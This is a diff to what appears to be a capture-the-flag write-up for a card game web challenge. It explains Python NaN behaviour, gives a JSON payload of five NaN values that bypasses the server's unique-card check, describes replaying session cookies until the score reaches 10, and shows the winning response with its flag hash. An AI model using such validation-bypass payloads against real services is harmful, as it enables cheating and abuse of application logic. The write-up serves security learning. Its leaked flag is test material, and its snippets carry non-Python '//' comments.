@@ -112,23 +112,91 @@ def play_cards(csv_card_choices, request_id):
         raise ValueError(err)
 
 ```
-#### NaN concepts
+#### NaN concepts 1
 
 ```python
 numbers = 1337
 boo = float("NaN")
 magic = boo+numbers
-print(magic) //output nan
+print(magic)
+
+//output nan
 ```
-#### Inject NaN in all the 5 numbers and send
-```json
-{"play":"NaN,NaN,NaN,NaN,NaN"}
+#### NaN concepts 2
+
+```python
+boo2 = float("NaN")
+print(boo)
+if boo2 == "NaN":
+    print("Got a NaN")
+else:
+    print("There is no NaN")
+
+//There is no NaN
 ```
 
 #### Forge for the win
-
-- For every successful response replay the old cookie with the new cookie
+- Send JSON data as NaN for all the cards number
+- We would bypass the unique card check due the the concept 2 above
+- 
+```json
+{"play":"NaN,NaN,NaN,NaN,NaN"}
+```
+- For every successful response replace the old cookie with the new cookie
 - Once the score reached 10 we would get the win success hash in our response
 ```json
-"conduit":{"hash":"a2a6c9bcc95608962d98d885e847c08e36908e00048cedf000fd259bd02e6f61","resourceId":"b5187f3e-8cd5-48c3-9796-001f332ea558"},
+{
+   "data":{
+      "conduit":{
+         "hash":"a2a6c9bcc95608962d98d885e847c08e36908e00048cedf000fd259bd02e6f61",
+         "resourceId":"b5187f3e-8cd5-48c3-9796-001f332ea558"
+      },
+      "maxItem":{
+         "num":"NaN",
+         "owner":"p"
+      },
+      "minItem":{
+         "num":"NaN",
+         "owner":"p"
+      },
+      "play_message":"Darn, how did I lose that hand!",
+      "player_cards":[
+         {
+            "num":"NaN",
+            "owner":"p"
+         },
+         {
+            "num":"NaN",
+            "owner":"p"
+         },
+         {
+            "num":"NaN",
+            "owner":"p"
+         },
+         {
+            "num":"NaN",
+            "owner":"p"
+         },
+         {
+            "num":"NaN",
+            "owner":"p"
+         }
+      ],
+      "player_score":0,
+      "score_message":"Darn, you win!",
+      "shifty_score":0,
+      "shiftys_cards":[
+         {
+            "num":0.0,
+            "owner":"s"
+         },
+         {
+            "num":9.0,
+            "owner":"s"
+         }
+      ],
+      "win_lose_tie_na":"w"
+   },
+   "request":true
+}
 ```
